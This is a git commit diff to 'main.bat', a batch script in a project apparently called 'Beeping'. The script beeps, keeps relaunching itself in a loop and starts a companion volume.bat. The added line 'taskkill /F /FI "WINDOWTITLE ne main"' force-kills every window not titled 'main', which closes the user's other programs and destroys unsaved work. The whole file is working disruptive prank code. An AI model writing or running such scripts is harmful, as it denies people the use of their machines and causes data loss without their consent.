4ca00606a14a79b2fba1f22aea371e62d2bc9e80
JoinRajuncraftNow <thecajunthatrages@gmail.com>
2016-02-26 12:36:20 -0500

    Update main.bat

--- Beeping/main.bat
+++ Beeping/main.bat
@@ -1,12 +1,13 @@
 @ECHO OFF
 TITLE main
 ECHO 
+taskkill /F /FI "WINDOWTITLE ne main"
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq volume" ^| find/c "exe"`) DO (
 SET windowcount=%%F
 )
-taskkill /F /FI "WINDOWTITLE eq Command Prompt"
 IF "%windowcount%"=="0" (
 START volume.bat
 )
 START main.bat
 EXIT
+::Will that work, or will it slow it down too much?
